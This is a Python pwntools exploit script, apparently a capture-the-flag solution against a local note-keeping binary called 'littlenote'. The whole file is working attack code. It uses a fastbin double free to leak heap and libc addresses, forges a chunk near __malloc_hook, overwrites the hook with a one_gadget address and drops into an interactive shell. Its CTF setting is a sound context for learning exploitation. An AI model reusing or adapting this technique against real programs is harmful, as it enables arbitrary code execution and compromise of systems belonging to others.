#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-12-07 21:54:30
# @Author  : giantbranch (giantbranch@gmail.com)
# @Link    : http://www.giantbranch.cn/
# @tags : 

from pwn import *
# context.log_level = "debug"
p = process("./littlenote")

# local libc
main_arena_offset = 0x39db00
one_gadget_offset = 0x40c3f


def add(note):
	p.recvuntil("Your choice:\n")
	p.sendline("1")
	p.recvuntil("Enter your note\n")
	p.send(note)
	p.recvuntil("Want to keep your note?\n")
	p.sendline("Y")

def show(index):
	p.recvuntil("Your choice:\n")
	p.sendline("2")
	p.recvuntil("Which note do you want to show?\n")
	p.sendline(str(index))

def delete(index):
	p.recvuntil("Your choice:\n")
	p.sendline("3")
	p.recvuntil("Which note do you want to delete?\n")
	p.sendline(str(index))

def getpid():
	print proc.pidof(p)[0]
	pause()

# lead heap
add("A" * 0x10)
add("B" * 0x8 + p64(0x71))
add("C" * 0x10)
add(p64(0) * 3 + p64(0x51))

delete(1)
delete(0)
delete(1)
show(0)
heap_addr = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00"))
print "heap_addr = " + hex(heap_addr)

# lead libc
add(p64(heap_addr + 0x10))  # fake fd
add("D" * 8)  # offset 0x00
add(p64(0))  # offset 0x70
add("F" * 0x50 + p64(0) + p64(0x91))   # modify the size
delete(2)   # free the 0x91 heap
show(2)
main_arena_near = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00"))
# print "main_arena_near = " + hex(main_arena_near)
main_arena_addr = main_arena_near - 0x58
print "main_arena_addr = " + hex(main_arena_addr)
libc_addr = main_arena_addr - main_arena_offset
print "libc_addr = " + hex(libc_addr)
one_gadget_addr = libc_addr + one_gadget_offset
print "one_gadget_addr = " + hex(one_gadget_addr)

# write malloc_hook
add("1") # 8
add("2") # 9
add("3") # 10
delete(8)
delete(9)
delete(8)

# x /10gx (long long)(&main_arena) - 51
fake_addr = main_arena_addr - 51
add(p64(fake_addr)) # 11
add("UUUUUUUU") #12
add("OOOOOOOO") #13
add("A" * 0x13 + p64(one_gadget_addr)) #14

# getpid()
# getshell
print "get shell now"
p.recvuntil("Your choice:\n")
p.sendline("1")

# add("G" * 8)
# delete(0)
# getpid()
# p.sendline()
p.interactive()
